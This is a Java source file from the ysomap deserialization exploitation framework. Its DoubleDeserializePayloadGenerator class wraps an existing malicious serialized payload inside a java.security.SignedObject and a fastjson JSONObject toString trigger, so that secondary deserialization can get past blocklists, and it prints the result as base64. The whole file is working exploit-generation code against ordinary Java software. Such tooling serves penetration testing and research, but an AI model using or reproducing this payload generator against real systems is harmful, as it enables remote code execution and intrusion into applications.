package ysomap.exploits.objects;

import com.alibaba.fastjson.JSONObject;
import ysomap.bullets.Bullet;
import ysomap.bullets.objects.ReturnObjectBullet;
import ysomap.common.annotation.*;
import ysomap.common.util.Status;
import ysomap.core.serializer.Serializer;
import ysomap.core.serializer.SerializerFactory;
import ysomap.core.util.DetailHelper;
import ysomap.core.util.PayloadHelper;
import ysomap.core.util.ReflectionHelper;
import ysomap.exploits.AbstractExploit;
import ysomap.payloads.AbstractPayload;
import ysomap.payloads.Payload;

import java.util.ArrayList;
import java.util.List;

@Exploits
@Authors({Authors.WH1T3P1G, Authors.whocansee})
@Require(bullets = {DetailHelper.ALL_JAVA_PAYLOAD}, param = false)
@Details("用于二次封装恶意序列化数据，触发二次反序列化")
public class DoubleDeserializePayloadGenerator extends AbstractExploit {

    @NotNull
    private Payload payload;

    @Override
    public void work() {
        Serializer serializer = SerializerFactory.createSerializer("default");
        try {
            serializer.setEncoder("base64");
            serializer.setOutputType("console");
            Object obj = payload.getObject();
            Payload signedObjectPayload = new SignedObjectPayload();
            Bullet bullet = signedObjectPayload.getDefaultBullet(obj);
            signedObjectPayload.setBullet(bullet);
            SerializerFactory.serialize("ysomap", serializer, signedObjectPayload);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void stop() {
        status = Status.STOPPED;
    }

    @Override
    public Payload getPayload() {
        return payload;
    }

    static class SignedObjectPayload extends AbstractPayload<Object> {

        @Override
        public Bullet getDefaultBullet(Object... args) throws Exception {
            return ReturnObjectBullet.newInstance(args[0]);
        }

        @Override
        public Object pack(Object obj) throws Exception {
            Serializer serializer = SerializerFactory.createSerializer("default");
            byte[] bytes = (byte[]) serializer.serialize(obj);

            Object signedObj = ReflectionHelper.createWithoutConstructor("java.security.SignedObject");
            ReflectionHelper.setFieldValue(signedObj, "content", bytes);
            ReflectionHelper.setFieldValue(signedObj, "signature", new byte[0]);
            JSONObject map = new JSONObject(); // also JSONArray
            map.put("ysomap", signedObj);
            List<Object> arrays = new ArrayList<>();
            arrays.add(signedObj);
            arrays.add(PayloadHelper.makeReadObjectToStringTrigger(map));
            return arrays;
        }
    }
}
